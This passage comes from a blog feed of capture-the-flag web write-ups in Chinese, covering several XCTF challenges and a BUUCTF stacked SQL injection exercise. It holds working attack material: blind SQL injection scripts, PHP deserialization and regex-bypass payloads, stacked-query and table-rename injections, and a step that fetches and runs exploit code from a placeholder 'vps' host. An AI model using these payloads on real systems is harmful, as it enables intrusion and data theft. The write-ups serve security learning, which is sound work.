class="string">"compress.zlib://data:@127.0.0.1/plain;base64,&#123;&#125;"</span>&#125;</span><br><span class="line">r0 = requests.get(<span class="string">'http://121.36.222.22:88/core/clear.php'</span>)</span><br><span class="line">print r0.<span class="keyword">text</span></span><br><span class="line">r = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> payload:</span><br><span class="line">    data1 = <span class="keyword">data</span>[<span class="string">"url"</span>].format(base64.b64encode(i))</span><br><span class="line">    data2 = &#123;<span class="string">"url"</span>:data1&#125;</span><br><span class="line">    assert len(i) &lt;= <span class="number">4</span></span><br><span class="line">    r1 = r.post(url = <span class="string">'http://121.36.222.22:88/core/index.php'</span>,headers = header,<span class="keyword">data</span> = data2)</span><br><span class="line">    print r1.content</span><br></pre></td></tr></table></figure></li></ol><h1 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h1><ol><li>传入2020 和Y都能查出结果，传入y20，yy，20y也可以，传入’union select 这些会爆服务器500。猜测后端对参数做了date()转换，用\可以使date后的字符串不变(新姿势)</li><li><p>那就好说了，可以联查</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'<span class="symbol">\u</span><span class="symbol">\n</span><span class="symbol">\i</span><span class="symbol">\o</span><span class="symbol">\n</span> <span class="symbol">\s</span><span class="symbol">\e</span><span class="symbol">\l</span><span class="symbol">\e</span><span class="symbol">\c</span><span class="symbol">\t</span> 1,<span class="symbol">\g</span><span class="symbol">\r</span><span class="symbol">\o</span><span class="symbol">\u</span><span class="symbol">\p</span>_<span class="symbol">\c</span><span class="symbol">\o</span><span class="symbol">\n</span><span class="symbol">\c</span><span class="symbol">\a</span><span class="symbol">\t</span>(<span class="symbol">\t</span><span class="symbol">\a</span><span class="symbol">\b</span><span class="symbol">\l</span><span class="symbol">\e</span>_<span class="symbol">\n</span><span class="symbol">\a</span><span class="symbol">\m</span><span class="symbol">\e</span>),3 <span class="symbol">\f</span><span class="symbol">\r</span><span class="symbol">\o</span><span class="symbol">\m</span> <span class="symbol">\i</span><span class="symbol">\n</span><span class="symbol">\f</span><span class="symbol">\o</span><span class="symbol">\r</span><span class="symbol">\m</span><span class="symbol">\a</span><span class="symbol">\t</span><span class="symbol">\i</span><span class="symbol">\o</span><span class="symbol">\n</span>_<span class="symbol">\s</span><span class="symbol">\c</span><span class="symbol">\h</span><span class="symbol">\e</span><span class="symbol">\m</span><span class="symbol">\a</span>.<span class="symbol">\t</span><span class="symbol">\a</span><span class="symbol">\b</span><span class="symbol">\l</span><span class="symbol">\e</span><span class="symbol">\s</span> <span class="symbol">\w</span><span class="symbol">\h</span><span class="symbol">\e</span><span class="symbol">\r</span><span class="symbol">\e</span> <span class="symbol">\t</span><span class="symbol">\a</span><span class="symbol">\b</span><span class="symbol">\l</span><span class="symbol">\e</span>_<span class="symbol">\s</span><span class="symbol">\c</span><span class="symbol">\h</span><span class="symbol">\e</span><span class="symbol">\m</span><span class="symbol">\a</span>=<span class="symbol">\d</span><span class="symbol">\a</span><span class="symbol">\t</span><span class="symbol">\a</span><span class="symbol">\b</span><span class="symbol">\a</span><span class="symbol">\s</span><span class="symbol">\e</span>()<span class="variable">%23</span></span><br></pre></td></tr></table></figure></li><li><p>就一般系统表注入查到账号密码和URL</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：/eGlhb2xldW5n</span><br><span class="line">账号：admin</span><br><span class="line">密码：<span class="number">20200202</span>goodluck</span><br></pre></td></tr></table></figure></li><li><p>进去check.php可以读文件但只能本地访问，可以file://localhost绕过，直接读flag不行，发现页面有注释</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php --&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>读一下这个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/eGlhb2xldW5n/check.php?url=file:<span class="comment">//localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $gf;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"> $number = str_split($number,<span class="number">2</span>);</span><br><span class="line"> <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line"> $str = $str .chr($num);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> strtolower($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> chr($number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">  $content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">  <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>有eval执行，但要绕过2层，第一层passwd是/m多行匹配，如下绕过</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">120200202</span>%<span class="number">0</span>aa.paaswd</span><br></pre></td></tr></table></figure></li><li><p>正则可以取反绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $gf;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> trick();</span></span><br><span class="line"><span class="php">$a-&gt;gf = <span class="string">'(~'</span>.~<span class="string">'phpinfo'</span>.<span class="string">')();'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(base64_encode(serialize($a)));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment"># Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoxMzoiKH6Pl4%2BWkZmQKSgpOyI7fQ%3D%3D</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li></ol><ul><li>新姿势</li></ul><p>我们使用这条代码 <strong>&lt;?php echo !!‘@’;?&gt;</strong> 发现打印出来的是<strong>1</strong>，那么我们只需利用 !!‘@’ 相加减 乘除再通过拼接字符串（.）即可得到FLAG(70766571)。<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)*(!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)+!!<span class="string">'@'</span>).(!!<span class="string">'@'</span>-!!<span class="string">'@'</span>).((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)* (!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)+!!<span class="string">'@'</span>).((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)*(!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)).((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)* (!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)).(((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)*(!!<span class="string">'@'</span>+!!<span class="string">'@'</span>))-!!<span class="string">'@'</span>).((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)* (!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)+!!<span class="string">'@'</span>).(!!<span class="string">'@'</span>);</span><br></pre></td></tr></table></figure></p><h1 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h1><ol><li><p>查看源码发现注释</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 110 --&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>故注册时改type为110就可以注册一个有权限的账号，进去后在search.php里发现存在注入</p></li><li><p>双写select和from绕过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import hackhttp</span><br><span class="line">hhp = hackhttp.hackhttp()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'''POST /search.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 121.37.179.47:1001</span></span><br><span class="line"><span class="string">Content-Length: 60</span></span><br><span class="line"><span class="string">Pragma: no-cache</span></span><br><span class="line"><span class="string">Cache-Control: no-cache</span></span><br><span class="line"><span class="string">Origin: http://121.37.179.47:1001</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span></span><br><span class="line"><span class="string">Referer: http://121.37.179.47:1001/search.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=tm931kor7tr5qnhd641nb9qrg7; username=6620aef2bb0988189fc2e05465b2c4d1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">"flag=1'or ascii(substr((selselectect flag frfromom fl4g),&#123;&#125;,1))&gt;&#123;&#125;%23"</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    tmp = len(res) </span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">31</span></span><br><span class="line">    mid = (low + high) <span class="regexp">//</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        data = str1.format(str2.format(i,mid))</span><br><span class="line">        code, head, html, redirect, log = hhp.http(url, raw=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'!'</span> <span class="keyword">in</span>  html:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) <span class="regexp">//</span> <span class="number">2</span></span><br><span class="line">    res += chr(int(mid))</span><br><span class="line">    print(res)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span>: </span><br><span class="line">        print(res[:-<span class="number">1</span>])</span><br><span class="line">        print(<span class="string">'emm.......'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li><li><p>这只能注出一半flag,剩下一半登陆admin看flag.php</p></li><li>但是admin登陆后有个数据库端口扫描功能，很明显的mysql客户端任意文件读取，直接rouge mysql server读flag即可</li></ol><h1 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">@mkdir($sandbox);</span></span><br><span class="line"><span class="php">@chdir($sandbox);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span></span><br><span class="line"><span class="php">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">highlight_file(__FILE_</span></span><br></pre></td></tr></table></figure><ol><li>上了个大马并没有卵用，看phpinfo()，发现PHP是7.4.2，直接用现成<a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">exp</a></li><li><p>把pwn(“uname -a”);改为pwn(“/readflag”),然后放到远程服务器上</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="keyword">cmd</span><span class="bash">=veal(file_get_contents(<span class="string">'http://vps/exp.php'</span>))</span></span><br></pre></td></tr></table></figure></li><li><p>或者改为pwn($_GET[‘pass’]),从远程服务器copy到题目中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">copy</span><span class="params">(<span class="string">"http://vps/1.txt"</span>,<span class="string">"/tmp/1.txt"</span>)</span></span></span><br></pre></td></tr></table></figure></li><li><p>然后直接include执行</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=include(<span class="string">"/tmp/1.txt"</span>);&amp;pass=ls /</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;前言:xctf的质量还是非常高的，尽管仅能做出比赛的一两题，赛后复现也能学到很多东西&lt;h1 id=&quot;webct&quot;&gt;&lt;a href=&quot;#webct&quot; class=&quot;headerlink&quot; title=&quot;webct&quot;&gt;&lt;/a&gt;webct&lt;/h1&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;扫面发现源码&lt;a href=&quot;http://www.zip,其中注意的是**uoloads**目录有个.htaccess&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip,其中注意的是**uoloads**目录有个.htaccess&lt;/a&gt;&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;php_flag&lt;/span&gt; engine &lt;span class=&quot;literal&quot;&gt;off&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="CTFWP" scheme="https://cy9nusg4rd3n.github.io/categories/CTFWP/"/>
    
    
      <category term="Web" scheme="https://cy9nusg4rd3n.github.io/tags/Web/"/>
    
      <category term="复现" scheme="https://cy9nusg4rd3n.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>一道堆叠注入的深入理解</title>
    <link href="https://cy9nusg4rd3n.github.io/2020/03/05/%E4%B8%80%E9%81%93%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/"/>
    <id>https://cy9nusg4rd3n.github.io/2020/03/05/一道堆叠注入的深入理解/</id>
    <published>2020-03-05T11:12:30.000Z</published>
    <updated>2020-04-18T03:27:48.573Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="强网杯随便住所带来的一些waf及绕过-训练平台buuctf"><a href="#强网杯随便住所带来的一些waf及绕过-训练平台buuctf" class="headerlink" title="强网杯随便住所带来的一些waf及绕过(训练平台buuctf)"></a>强网杯随便住所带来的一些waf及绕过(训练平台buuctf)</h1><ol><li>进来是一个输入框<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//e363d307-2ea5-4947-921c-99079448435d.node1.buuoj.cn/?inject=1</span></span><br><span class="line"></span><br><span class="line">回显:</span><br><span class="line">array(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="meta">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">"1"</span></span><br><span class="line">  [<span class="meta">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">"hahahah"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><ol start="2"><li><p>输入’报错</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://e363d307<span class="string">-2</span>ea5<span class="string">-4947</span><span class="string">-921</span>c<span class="string">-99079448435</span>d.node1.buuoj.cn/?inject=1'</span><br><span class="line"></span><br><span class="line">回显：</span><br><span class="line"><span class="keyword">error </span>1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1</span><br></pre></td></tr></table></figure></li><li><p>通过回显发现列数为2</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://e363d307-2ea5-4947-921c-99079448435d.node1.buuoj.cn/?inject=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">回显：</span><br><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure></li><li><p>过滤了很多关键字,后来发现是堆叠注入</p></li><li>Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。</li><li>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</li><li><p>查表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//e363d307-2ea5-4947-921c-99079448435d.node1.buuoj.cn/?inject=1';show tables;#</span></span><br><span class="line"></span><br><span class="line">回显：</span><br><span class="line"><span class="function"><span class="title">array</span><span class="params">(<span class="number">2</span>)</span></span> &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"1"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">7</span>) <span class="string">"hahahah"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array</span><span class="params">(<span class="number">1</span>)</span></span> &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">16</span>) <span class="string">"1919810931114514"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array</span><span class="params">(<span class="number">1</span>)</span></span> &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"words"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>经测试发现flag在1919810931114514表中</p></li><li><p>尝试查表内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://e363d307-2ea5-4947-921c-99079448435d.node1.buuoj.cn/?inject=1%27;<span class="keyword">set</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;<span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">回显：</span><br><span class="line">strstr($inject, "<span class="keyword">set</span><span class="string">") &amp;&amp; strstr($inject, "</span><span class="keyword">prepare</span><span class="string">")</span></span><br></pre></td></tr></table></figure></li><li><p>大小写绕过</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//e363d307-2ea5-4947-921c-99079448435d.node1.buuoj.cn/?inject=1%27;Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;Prepare execsql from @a;execute execsql;#</span></span><br><span class="line"></span><br><span class="line">回显：</span><br><span class="line">array(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="meta">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">"1"</span></span><br><span class="line">  [<span class="meta">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">"hahahah"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="meta">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">42</span>) <span class="string">"flag&#123;3d05bcc4-ae5d-4014-88bf-b945dc7cce65&#125;"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>ps:0x73656c656374202a2066726f6d20603139313938313039333131313435313460==select * from `1919810931114514`,`为反引号</li></ul><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);</span></span><br></pre></td></tr></table></figure><ol><li>从上面可以看到其实过滤比较少，我们在注入中还用到了<strong>set</strong>和<strong>prepare</strong>,如果把这个2个也加进黑名单呢？</li><li><p>这时我们可以用如下操作，关键字为<strong>alert</strong>和<strong>rename</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>将<span class="built_in">words</span>表改名为word1或其它任意名字</span><br><span class="line"></span><br><span class="line"><span class="number">2.1919810931114514</span>改名为<span class="built_in">words</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>将新的<span class="built_in">word</span>表插入一列，列名为<span class="built_in">id</span> <span class="comment">#因为通过desc发现flag表里面没有id字段</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>将flag列改名为data</span><br></pre></td></tr></table></figure></li><li><p>这样我们就把flag放到默认表了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">rename</span> <span class="keyword">table</span> words <span class="keyword">to</span> word1;<span class="keyword">rename</span> <span class="keyword">table</span> <span 